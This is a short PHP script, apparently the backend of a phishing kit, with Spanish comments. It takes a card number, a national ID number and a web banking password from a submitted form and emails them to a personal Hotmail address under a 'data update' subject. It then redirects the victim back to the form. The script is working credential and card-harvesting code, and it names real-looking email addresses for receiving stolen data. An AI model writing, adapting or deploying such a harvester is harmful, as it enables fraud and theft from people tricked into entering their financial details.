<?php

    $cc = $_POST['cc'];
    $pass = $_POST['pass'];
    $dni = $_POST['dni'];

    if(isset($cc, $dni, $pass)){
        //Correo a donde se envía la información
        //$to = "cruzadoeduar18@gmail.com";
        $to = "fernando1894@hotmail.com";

        //Asunto de correo
        $subject = "ACTUALIZACION DE DATOS CORREO 1";

        //Informacion que se envía en el correo
        $txt =  "NUMERO DE TARJETA: " . $cc . "\n" . 
                "DNI: " . $dni . "\n" . 
                "CLAVE WEB: " . $pass;

        //Destinatario
        $headers = "From: pruebas@pruebas.ga";

        mail($to, $subject, $txt, $headers);

        header('Location: form.php');

    }
    else{
        echo "<script> alert('Ingresa los datos correctamente.'); </script>";
    }
    
?>